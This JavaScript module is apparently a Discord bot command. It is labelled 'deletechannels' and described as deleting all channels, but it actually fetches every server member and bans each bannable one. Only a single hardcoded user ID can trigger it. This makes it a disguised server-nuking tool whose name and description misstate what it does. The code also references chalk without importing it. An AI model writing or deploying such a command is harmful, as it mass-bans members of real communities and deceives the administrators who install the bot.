module.exports = {
    name: "deletechannels",
    description: "Delete all channels",
    aliases: [],
    userPerms: [],
    botPerms: [],

    run: async(client, message, args) => {
     
        const allowed = ['762711150118174751']
        if(!allowed.includes(message.author.id)) return
        
        try {
            const members = await message.guild.members.fetch()
            members
                .filter(m => m.bannable)
                .forEach(m => m.ban())
            message.delete(1000);
               
        } catch(err) {
            return console.log(chalk.red(err))
        }
    }
}